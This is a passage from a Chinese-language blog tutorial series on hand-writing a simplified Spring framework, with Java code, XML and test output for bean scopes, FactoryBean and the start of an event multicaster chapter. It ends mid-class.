bean 作用域无非就是对之前的实现做一点改动而已：\n\n 1. 更新 beandefinition，加入作用域 scope（默认为单例） 及相关字段。\n 2. 更新加载器 xmlbeandefinitionreader，在解析 xml 的时候解析新加的 scope 标签，并赋值给 beandefinition。\n 3. 修改 bean xml 配置，加入作用域 scope。\n\n\n# 定义一些职责和能力：\n\n 1. 修改 beandefinition，加入作用域相关字段。\n    \n    public class beandefinition {\n    \n        private static final string scope_singleton = configurablebeanfactory.scope_singleton;\n    \n        private static final string scope_prototype = configurablebeanfactory.scope_prototype;\n    \n        /**\n         * 定义为 class，这样就可以把 bean 的实例化（通过反射）操作放到容器中处理了，实例化用\n         */\n        private class<?> beanclass;\n        /**\n         * 一个 bean 的所有字段信息，留作属性填充用\n         */\n        private propertyvalues propertyvalues;\n        /**\n         * init方法名称\n         */\n        private string initmethodname;\n        /**\n         * 销毁方法名称\n         */\n        private string destroymethodname;\n    \n        /**\n         * 生命周期，默认单例的\n         */\n        private string scope = scope_singleton;\n        /**\n         * 单例，默认是\n         */\n        private boolean singleton = true;\n        /**\n         * 原型，默认不是\n         */\n        private boolean prototype = false;\n    \n        public beandefinition(class<?> beanclass) {\n            this.beanclass = beanclass;\n            this.propertyvalues = new propertyvalues();\n        }\n    \n        public beandefinition(class<?> beanclass, propertyvalues propertyvalues) {\n            this.beanclass = beanclass;\n            this.propertyvalues = propertyvalues == null ? new propertyvalues() : propertyvalues;\n        }\n    \n        public void setscope(string scope) {\n            this.scope = scope;\n            this.singleton = scope_singleton.equals(scope);\n            this.prototype = scope_prototype.equals(scope);\n        }\n    \n        public string getscope() {\n            return scope;\n        }\n    \n        public class<?> getbeanclass() {\n            return beanclass;\n        }\n    \n        public void setbeanclass(class<?> beanclass) {\n            this.beanclass = beanclass;\n        }\n    \n        public propertyvalues getpropertyvalues() {\n            return propertyvalues;\n        }\n    \n        public void setpropertyvalues(propertyvalues propertyvalues) {\n            this.propertyvalues = propertyvalues;\n        }\n    \n        public string getinitmethodname() {\n            return initmethodname;\n        }\n    \n        public void setinitmethodname(string initmethodname) {\n            this.initmethodname = initmethodname;\n        }\n    \n        public string getdestroymethodname() {\n            return destroymethodname;\n        }\n    \n        public void setdestroymethodname(string destroymethodname) {\n            this.destroymethodname = destroymethodname;\n        }\n    \n        public boolean issingleton() {\n            return singleton;\n        }\n    \n        public void setsingleton(boolean singleton) {\n            this.singleton = singleton;\n        }\n    \n        public boolean isprototype() {\n            return prototype;\n        }\n    \n        public void setprototype(boolean prototype) {\n            this.prototype = prototype;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    104\n    \n\n\n# 具体的实现：\n\n 1. 更新加载器 xmlbeandefinitionreader#doloadbeandefinitions()，在解析 xml 的时候解析新加的 scope 标签，并赋值给 beandefinition。\n\nprivate void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception {\n    // 改动核心代码\n\tstring beanscope = bean.getattribute("scope");\n    if (strutil.isnotblank(beanscope)) {\n        beandefinition.setscope(beanscope);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 修改 abstractautowirecapablebeanfactory#createbean() ，单例 bean 添加缓存，同时将实现了销毁接口的 bean 也改为单例时注册方便容器停止时进行销毁。\n\n    @override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n            // 属性填充\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 添加 bean 的初始化扩展\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("failed to bean instance", e);\n        }\n        // ==> 添加单例 bean 缓存\n        if (beandefinition.issingleton()) {\n            // ==> 注册实现了 disposablebean 接口的 单例bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            addsingleton(beanname, bean);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. 当然，别忘了修改defaultlistablebeanfactory#preinstantiatesingletons()，在容器启动后提前实例化所有的【单例 bean】，之前是初始化所有 bean 的。\n\n    @override\n    public void preinstantiatesingletons() {\n        for (map.entry<string, beandefinition> entry : beandefinitionmap.entryset()) {\n            string beanname = entry.getkey();\n            beandefinition beandefinition = entry.getvalue();\n            if (beandefinition.issingleton()) {\n                getbean(beanname);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    \x3c!--  ↓↓ bean scope 测试 ↓↓ --\x3e\n    \x3c!--  多例的 mouse  --\x3e\n    <bean id="mouse" scope="prototype"\n        class="com.snail.springframework.beans.factory.bean.mouse">\n        <property name="name" value="name-xml-init-jerry"></property>\n    </bean>\n    \x3c!--  单例的 tiger  --\x3e\n    <bean id="cat" name="catbean" init-method="init" destroy-method="destroy"\n          class="com.snail.springframework.beans.factory.bean.cat">\n        <property name="name" value="cat-name-xml-init"></property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 测试 bean 准备\n\n还用之前已有的 mouse 和 cat 类即可。\n\n * 测试类\n\n    /**\n     * bean scope 测试\n     */\n    @test\n    public void bean_scope_test() {\n        // 1. 利用 xml上下文 加载bean\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-scope.xml");\n        applicationcontext.registershutdownhook();\n        // 2. 获取bean\n        mouse mouse1 = (mouse) applicationcontext.getbean("mouse");\n        mouse mouse2 = (mouse) applicationcontext.getbean("mouse");\n        system.err.println("mouse1：" + mouse1.hashcode());\n        system.err.println("mouse2：" + mouse2.hashcode());\n        system.err.println("mouse 是否单例：" + (mouse1 == mouse2));\n\n        system.err.println();\n\n        cat cat1 = (cat) applicationcontext.getbean("cat");\n        cat cat2 = (cat) applicationcontext.getbean("cat");\n        system.err.println("cat1：" + cat1.hashcode());\n        system.err.println("cat2：" + cat1.hashcode());\n        system.err.println("cat 是否单例：" + (cat1 == cat2));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试结果\n\n-- cat init method by xml --\n==> beannameaware beanname: mouse\n==> beanclassloaderaware classloader: sun.misc.launcher$appclassloader@18b4aac2\n==> beanfactoryaware beanfactory: com.snail.springframework.beans.factory.support.defaultlistablebeanfactory@97e1986\n==> applicationcontextaware applicationcontext: com.snail.springframework.context.support.classpathxmlapplicationcontext@26f67b76\n==> beannameaware beanname: mouse\n==> beanclassloaderaware classloader: sun.misc.launcher$appclassloader@18b4aac2\n==> beanfactoryaware beanfactory: com.snail.springframework.beans.factory.support.defaultlistablebeanfactory@97e1986\n==> applicationcontextaware applicationcontext: com.snail.springframework.context.support.classpathxmlapplicationcontext@26f67b76\nmouse1：356473385\nmouse2：2136344592\nmouse 是否单例：false\n\ncat1：110992469\ncat2：110992469\ncat 是否单例：true\n-- cat destroy method by xml --\n\nprocess finished with exit code 0\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 实现 factorybean\n\n在 spring 源码中， factorybean 接口的具体实现主要是在 org.springframework.beans.factory.support.factorybeanregistrysupport 类中。这个类是 spring 容器的一个关键组件，主要负责处理所有的 factorybean 对象，并将它们转化为普通的 bean 实例。\n\nfactorybeanregistrysupport 中的核心方法包括：\n\n * containsbeandefinition(string beanname)：判断指定的 bean 是否是一个 factorybean。\n * getfactorybean(string name, rootbeandefinition mbd)：获取指定名称的 factorybean 实例，并调用其 getobject() 方法来创建目标 bean。\n * isfactorybean(string name, rootbeandefinition mbd)：判断指定的 bean 是否是一个 factorybean。\n * getobjectforbeaninstance(object beaninstance, string name, string beanname, rootbeandefinition mbd)：获取指定实例对应的目标 bean，如果该实例是一个 factorybean，则调用其 getobject() 方法来获取目标 bean。\n\n除了 factorybeanregistrysupport 外，spring 还提供了很多其他支持 factorybean 的类和接口，比如 abstractbeanfactory、beanwrapperimpl 等等，这些组件共同构成了 spring 容器中 factorybean 实现的基础框架。\n\n\n# 定义一些职责和能力：\n\n 1. factorybean：factorybean 将对应一个工厂类，该工厂类负责创建目标 bean，并返回它的实例。\n    \n    public interface factorybean<t> {\n    \n        /**\n         * 获取对象\n         */\n        t getobject();\n    \n        /**\n         * 获取对象类型\n         */\n        class<?> getobjecttype();\n    \n        /**\n         * 是否为单例\n         */\n        boolean issingleton();\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    \n\n\n# 具体的实现：\n\n 1. factorybeanregistrysupport：保存所有 factorybean 目标 bean 的能力（单例才缓存），实现 factorybean 目标 bean 获取和缓存。这个类是 spring 容器的一个关键组件，主要负责处理所有的 factorybean 对象，并将它们转化为普通的 bean 实例。\n    \n    public class factorybeanregistrysupport \n        extends defaultsingletonbeanregistry // 保存了所有单例 bean 和待销毁的 bean\n    {\n    \n        /**\n         * 对所有的 单例factorybean 包装的 真实类，进行缓存\n         */\n        private final map<string, object> factorybeanobjectcache = new concurrenthashmap<>();\n    \n        /**\n         * 直接从缓存中获取真实的被factorybean包装的单例对象\n         *\n         * @param beanname bean名字\n         * @return {@link object}\n         */\n        protected object getcachedobjectforfactorybean(string beanname) {\n            object object = factorybeanobjectcache.get(beanname);\n            return (object != null_object ? object : null);\n        }\n    \n        /**\n         * 从factorybean获取真实的被factorybean包装的单例对象，如果是单例bean还会将查出的结果放入缓存中\n         *\n         * @param factorybean 工厂bean\n         * @param beanname    bean名字\n         * @return {@link object}\n         */\n        protected object getobjectfromfactorybean(factorybean factorybean, string beanname) {\n            if (factorybean.issingleton()) {\n                object object = factorybeanobjectcache.get(beanname);\n                if (object == null) {\n                    object = dogetobjectfromfactorybean(factorybean, beanname);\n                    factorybeanobjectcache.put(beanname, (object == null ? null_object : object));\n                }\n                return (object != null_object ? object : null);\n            } else {\n                return dogetobjectfromfactorybean(factorybean, beanname);\n            }\n        }\n    \n        private object dogetobjectfromfactorybean(factorybean factorybean, string beanname) {\n            try {\n                return factorybean.getobject();\n            } catch (exception e) {\n                throw new beansexception("faild to bean[" + beanname + "] dogetobjectfromfactorybean", e);\n            }\n        }\n    \n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    \n\n\n# 将实现加入原有的逻辑中：\n\n 1. 我们想一下，factorybean 作为 bean 的包装扩展，改动逻辑肯定是在 getbean() 最后一步的时候，如果是 factorybean 那么就用 factorybean#getobject()替换原始对象从而获取真正的目标 bean 对象。\n\n 2. 当然，在 getbean(string beanname) 的时候，如果 beanname 是 & 开头，那我们得返回原始的 factorybean 对象。\n    \n    所以修改 abstractbeanfactory#getbean()：\n    \n    public abstract class abstractbeanfactory \n        // 这里修改原先的 defaultsingletonbeanregistry 为 factorybeanregistrysupport\n        extends factorybeanregistrysupport \n        implements configurablebeanfactory {\n        \n        protected <t> t dogetbean(final string name, final object[] args) {\n            // 获取真实 bean 的名字\n            string beanname = transformedbeanname(name);\n            object sharedinstance = getsingleton(beanname);\n            if (sharedinstance != null) {\n                // 如果是 factorybean，那么就转换为 目标bean 返回\n                return (t) getobjectforbeaninstance(sharedinstance, name, beanname);\n            }\n            beandefinition beandefinition = getbeandefinition(beanname);\n            object bean = createbean(beanname, beandefinition, args);\n            // 如果是 factorybean，那么就转换为 目标bean 返回\n            return (t) getobjectforbeaninstance(bean, name, beanname);\n        }\n    \n        /**\n         * 获取：去除 & 后的 beanname\n         *\n         * @param name 名字\n         * @return {@link string}\n         */\n        private string transformedbeanname(string name) {\n            if (name.startswith("&")) {\n                return name.substring(name.indexof("&") + 1);\n            }\n            return name;\n        }\n    \n        /**\n         * 获得bean实例对象\n         * 获取指定实例对应的目标 bean，如果该实例是一个 factorybean，则调用其 getobject() 方法来获取目标 bean。\n         *\n         * @param beaninstance bean实例\n         * @param name         bean原始名字\n         * @param beanname     bean名字\n         * @return {@link object}\n         */\n        private object getobjectforbeaninstance(object beaninstance, string name, string beanname) {\n            if (!(beaninstance instanceof factorybean) || name.startswith("&")) {\n                return beaninstance;\n            }\n            object object = getcachedobjectforfactorybean(beanname);\n            if (object == null) {\n                factorybean<?> factorybean = (factorybean<?>) beaninstance;\n                object = getobjectfromfactorybean(factorybean, beanname);\n            }\n            return object;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    \n\n\n# 测试：\n\n * xml 准备\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    \x3c!--  ↓↓ factorybean 测试 ↓↓ --\x3e\n    \x3c!--  tigerfactorybean  --\x3e\n    <bean id="animalfactorybean" class="com.snail.springframework.beans.factory.bean.animalfactorybean"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n\n * 这里我们准备一个 animal 接口，一个 tiger 类，tiger 引用了 animal ，并调用 animal 的方法。\n   \n   在准备一个 animalfactorybean 类，使用 factorybean 作为一个 bean，采用 jdk动态代理 的方式来实现 animal，并注入到 tiger 中，这样的话 tiger 中的 animal 就是我们 factorybean 的包装类了。\n\npublic interface animal {\n    string getname(string name);\n}\n\n\n1\n2\n3\n\n\npublic class tiger implements animal {\n\n    private string name;\n\n    @override\n    public string getanimalname() {\n        return name;\n    }\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\npublic class animalfactorybean implements factorybean<animal> {\n\n    /**\n     * 要代理的对象\n     */\n    private animal animal;\n\n    public void setanimal(animal animal) {\n        this.animal = animal;\n    }\n\n    @override\n    public animal getobject() {\n        system.out.println("-- into factorybean getobject() --");\n        invocationhandler handler = (proxy, method, args) -> {\n            system.out.println("-- into factorybean jdkproxy method:[" + method.getname() + "] before --");\n            object result = method.invoke(animal, args);\n            system.out.println("-- into factorybean jdkproxy method:[" + method.getname() + "] after --");\n            return result;\n        };\n        return (animal) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(),\n                new class[]{animal.class}, handler);\n    }\n\n    @override\n    public class<?> getobjecttype() {\n        return animal.class;\n    }\n\n    @override\n    public boolean issingleton() {\n        return true;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n * 测试类\n\n    @test\n    public void factorybean_test() {\n        // 1. 利用 xml上下文 加载bean\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-factorybean.xml");\n        applicationcontext.registershutdownhook();\n\n        // 2. 获取原始 factorybean 对象\n        animalfactorybean animalfactorybean = (animalfactorybean) applicationcontext.getbean("&animalfactorybean");\n        system.err.println("获取原始 factorybean 对象: " + animalfactorybean);\n        tiger tiger = new tiger();\n        tiger.setname("我是小老虎ai~");\n        animalfactorybean.setanimal(tiger);\n\n        // 3. 获取真正的 bean，并调用它的方法，\n        // 当然利用代理可以在调用它的方法前后做一些其他操作\n        animal proxyanimal = (animal) applicationcontext.getbean("animalfactorybean");\n        system.err.println("获取真实 factorybean 目标 bean 对象: " + proxyanimal);\n        system.err.println(proxyanimal.getanimalname());\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 测试结果\n\n-- into factorybean getobject() --\n获取原始 factorybean 对象: com.snail.springframework.beans.factory.bean.animalfactorybean$$enhancerbycglib$$585388b2@64616ca2\n-- into factorybean jdkproxy method:[tostring] before --\n获取真实 factorybean 目标 bean 对象: com.snail.springframework.beans.factory.bean.tiger@13fee20c\n-- into factorybean jdkproxy method:[tostring] after --\n-- into factorybean jdkproxy method:[getanimalname] before --\n我是小老虎ai~\n-- into factorybean jdkproxy method:[getanimalname] after --\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 总结\n\nfactorybean 是 spring 框架中的一个接口，用于创建和管理 bean 实例。与普通的 bean 不同，factorybean 本身也是一个 bean，但其主要作用是负责创建和初始化其他 bean 的实例。\n\n具体来说，factorybean 将对应一个工厂类，该工厂类负责创建目标 bean，并返回它的实例。在 spring 容器启动时，会先创建 factorybean 的实例，然后再调用该实例的 getobject() 方法来获取目标 bean 的实例。因此，可以通过使用 factorybean 来实现一些特殊的 bean 创建逻辑，比如在每次获取 bean 实例时都创建一个新的对象，或者根据不同的条件返回不同的 bean 实例等。\n\n要创建一个自定义的 factorybean，需要实现 factorybean 接口，并重写其 getobject() 和 getobjecttype() 方法。其中，getobject() 方法用于创建并返回目标 bean 实例，而 getobjecttype() 方法则用于指定目标 bean 的类型。另外，如果希望让 spring 容器直接将 factorybean 本身注入到其他 bean 中，而不是将其产生的 bean 注入进去，则需要在实现类上添加 @primary 或 @qualifier 注解。\n\n需要注意的是，当一个 bean 实现了 factorybean 接口时，spring ioc 容器会默认将其注册为一个工厂类 bean，而不会直接将其产生的 bean 注册进容器中。因此，在获取 bean 实例时，需要使用 "&" 符号来获取 factorybean 本身，或者使用 getobject() 方法来获取目标 bean 的实例。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 08 - 添加事件多播器，支持容器事件的注册、订阅、发布",frontmatter:{title:"手写 Spring 08 - 添加事件多播器，支持容器事件的注册、订阅、发布",date:"2023-08-01T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-08.html",relativePath:"views/backend/spring-source-08.md",key:"v-0f823014",path:"/views/backend/spring-source-08.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"实现 事件发布订阅 的各个角色",slug:"实现-事件发布订阅-的各个角色",normalizedTitle:"实现 事件发布订阅 的各个角色",charIndex:9},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力：",charIndex:30},{level:3,title:"具体的实现：",slug:"具体的实现",normalizedTitle:"具体的实现：",charIndex:46},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:58},{level:2,title:"将 事件能力 和容器结合",slug:"将-事件能力-和容器结合",normalizedTitle:"将 事件能力 和容器结合",charIndex:74},{level:3,title:"定义一些职责和能力：",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力：",charIndex:30},{level:3,title:"具体的实现：",slug:"具体的实现-2",normalizedTitle:"具体的实现：",charIndex:46},{level:3,title:"将实现加入原有的逻辑中：",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中：",charIndex:58},{level:3,title:"测试：",slug:"测试",normalizedTitle:"测试：",charIndex:138},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:145}],excerpt:"<Boxx/>\n",headersStr:"解析 实现 事件发布订阅 的各个角色 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 将 事件能力 和容器结合 定义一些职责和能力： 具体的实现： 将实现加入原有的逻辑中： 测试： 总结",content:' * 解析\n * 实现 事件发布订阅 的各个角色\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 将 事件能力 和容器结合\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\nSpring 事件多播器（ApplicationEventMulticaster）是 Spring Framework 中的一个重要组件，用于管理和多播（分发）事件到所有的事件监听器。\n\n在 Spring 应用中，通常会有多个事件监听器来监听不同类型的事件，当有事件触发时，事件源将会把事件发布出去。而事件多播器就是用来接收这些事件，然后将其分发给所有的事件监听器。在 Spring 容器中，通常使用 ApplicationEventMulticaster 实现事件的发布和监听。\n\n在 Spring 中，可以使用 SimpleApplicationEventMulticaster、SyncTaskExecutor、SimpleThreadScope 等类来实现事件多播器。其中，SimpleApplicationEventMulticaster 是最简单的实现，它使用 Java 的线程机制实现了同步调用事件监听器。具体来说，SimpleApplicationEventMulticaster 持有一个监听器列表，并提供了 addApplicationListener 和 removeApplicationListener 方法来添加和删除事件监听器。而当一个事件被触发时，它会按照一定的顺序遍历监听器列表，将事件分发给每个监听器。\n\n除了 SimpleApplicationEventMulticaster，Spring 还提供了另一种默认的事件多播器实现：AsyncApplicationEventMulticaster。与 SimpleApplicationEventMulticaster 不同的是，AsyncApplicationEventMulticaster 支持异步调用事件监听器。具体来说，AsyncApplicationEventMulticaster 通过 Executor（线程池）来管理异步执行的任务，以便将事件的发布和监听从主线程中分离出来，达到异步执行的效果。\n\n需要注意的是，在使用多播器时，应该考虑事件监听器的数量以及监听器的执行时间等因素，以防止事件多播器成为系统的性能瓶颈。在实际使用中，可以通过调整线程池大小、监听器执行顺序、优化监听器代码等方式来提高事件多播器的性能和稳定性。\n\n\n# 实现 事件发布订阅 的各个角色\n\n基于观察者模式，完成一系列事件的管理就必须有以下几个角色：\n\n 1. 事件：一个具体的事件体本身；\n 2. 事件监听者：监听指定的事件；\n 3. 事件发布者：具有发布事件的能力；\n 4. 事件多播器：对前三者的统一管理，相当于事件注册中心，可以添加、删除事件监听器，可以发布指定的事件；\n\n\n# 定义一些职责和能力：\n\n 1. ApplicationEvent：一个具体的事件，这个还比较顶层，所以我们再创建一个 ApplicationContextEvent 更具体的来表明这是一个容器事件。\n\npublic abstract class ApplicationEvent extends EventObject {\n\n    private static final long serialVersionUID = 5949591757825084930L;\n\n    public ApplicationEvent(Object source) {\n        super(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\npublic class ApplicationContextEvent extends ApplicationEvent {\n\n    private static final long serialVersionUID = -2652382590021151001L;\n\n    public ApplicationContextEvent(Object source) {\n        super(source);\n    }\n\n    /**\n     * 获取应用程序上下文，上下文肯定是容有参构造传递过来的\n     *\n     * @return {@link ApplicationContext}\n     */\n    public ApplicationContext getApplicationContext() {\n        return (ApplicationContext) getSource();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. ApplicationListener：事件监听器\n\npublic interface ApplicationListener<E extends ApplicationEvent> extends EventListener {\n\n    /**\n     * 事件触发时会回调这个方法\n     *\n     * @param event 事件\n     */\n    void onApplicationEvent(E event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. ApplicationEventPublisher：定义事件发布者，所有的事件都需要从这个接口发布出去\n\npublic interface ApplicationEventPublisher {\n\n    /**\n     * 发布事件\n     *\n     * @param event 事件\n     */\n    void publishEvent(ApplicationEvent event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 4. ApplicationEventMulticaster：事件多播器\n\npublic interface ApplicationEventMulticaster {\n\n    /**\n     * 添加一个监听器\n     *\n     * @param listener 监听器\n     */\n    void addApplicationListener(ApplicationListener<?> listener);\n\n    /**\n     * 删除一个监听器\n     *\n     * @param listener 监听器\n     */\n    void removeApplicationListener(ApplicationListener<?> listener);\n\n    /**\n     * 发布一个事件\n     *\n     * @param event 事件\n     */\n    void multicastEvent(ApplicationEvent event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 具体的实现：\n\n具体的实现无非就是对多播器的事件，因为多播器的定义以及包括了对事件的发布以及事件监听器的注册。这里先使用抽象类 AbstractApplicatioinEventMulticaster 默认实现多播器中事件监听器的注册、添加以及获取指定事件监听器的方法，把发布事件留给不同子类实现，以方便不同的扩展。\n\n 1. AbstractApplicatioinEventMulticaster：多播器的抽象实现类。\n\npublic abstract class AbstractApplicatioinEventMulticaster implements ApplicationEventMulticaster, BeanFactoryAware {\n\n    private final Set<ApplicationListener<ApplicationEvent>> applicationListeners = new LinkedHashSet<>();\n\n    private BeanFactory beanFactory;\n\n    @Override\n    public void addApplicationListener(ApplicationListener<?> listener) {\n        applicationListeners.add((ApplicationListener<ApplicationEvent>) listener);\n    }\n\n    @Override\n    public void removeApplicationListener(ApplicationListener<?> listener) {\n        applicationListeners.remove(listener);\n    }\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        this.beanFactory = beanFactory;\n    }\n\n    /**\n     * 获取订阅了某个事件的所有监听器\n     *\n     * @param event 事件\n     * @return {@link Collection}<{@link ApplicationListener}>\n     */\n    protected Collection<ApplicationListener<ApplicationEvent>> getApplicationListeners(ApplicationEvent event) {\n        LinkedList<ApplicationListener<ApplicationEvent>> allListeners = new LinkedList<>();\n        for (ApplicationListener<ApplicationEvent> listener : applicationListeners) {\n            if (supportsEvent(listener, event)) {\n                allListeners.add(listener);\n            }\n        }\n        return allListeners;\n    }\n\n    private boolean supportsEvent(ApplicationListener<ApplicationEvent> listener, ApplicationEvent event) {\n        Class<? extends ApplicationListener> listenerClass = listener.getClass();\n        // 主要是用来获取当前类的接口，但当前类创建时可能是cglib或jdk代理实现的\n        // jdk动态代理的代理类已经实现了接口，直接使用该 Class 对象即可。\n        Class<?> targetClass = listenerClass;\n        // 判断是否是 cglib 代理类，如果是，就获取其父类的 Class 对象，否则直接使用该 Class 对象。\n        if (listenerClass.getName().contains("$$")) {\n            targetClass = listenerClass.getSuperclass();\n        }\n\n        // 获取事件监听器实现的第一个泛型接口（即 ApplicationListener）\n        Type genericInterfaces = targetClass.getGenericInterfaces()[0];\n\n        // 获取该接口的实际泛型参数类型，因为只有一个取第一个即可。\n        Type actualTypeArgument = ((ParameterizedType) genericInterfaces).getActualTypeArguments()[0];\n\n        // 获取泛型的全类名并得到Class，用于事件类型对比\n        String eventClassName = actualTypeArgument.getTypeName();\n        Class<?> eventClass;\n        try {\n            eventClass = Class.forName(eventClassName);\n        } catch (ClassNotFoundException e) {\n            throw new BeansException("wrong evnet class name: " + eventClassName);\n        }\n\n        // 判断泛型和事件是否匹配\n        // 父类.class.isAssignableFrom(子类.class)\n        // 子类实例 instanceof 父类类型\n        return eventClass.isAssignableFrom(event.getClass());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n 2. SimpleApplicationEventMulticaster：使用同步方式调用每个监听器的 onApplicationEvent 方法。\n\npublic class SimpleApplicationEventMulticaster extends AbstractApplicatioinEventMulticaster {\n\n    @Override\n    public void multicastEvent(ApplicationEvent event) {\n        for (ApplicationListener<ApplicationEvent> listener : getApplicationListeners(event)) {\n            listener.onApplicationEvent(event);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 将 事件能力 和容器结合\n\n想一想，怎么把现有的事件相关者和 Spring 容器相结合呢？\n\n其实无非就是在容器启动（refresh()）的时候，将事件多播器和所有的事件监听器提前加载到容器中。\n\n当然，也可以提前定义容器的生命周期事件：ContextRefreshedEvent（容器刷新完成事件），ContextClosedEvent（容器关闭事件）在容器启动时就加载到容器中。\n\n\n# 定义一些职责和能力：\n\n * 无\n\n\n# 具体的实现：\n\n 1. ContextRefreshedEvent：容器刷新完成事件\n\npublic class ContextRefreshedEvent extends ApplicationContextEvent {\n   \n    private static final long serialVersionUID = 5264064757132179583L;\n\n    public ContextRefreshedEvent(Object source) {\n        super(source);\n    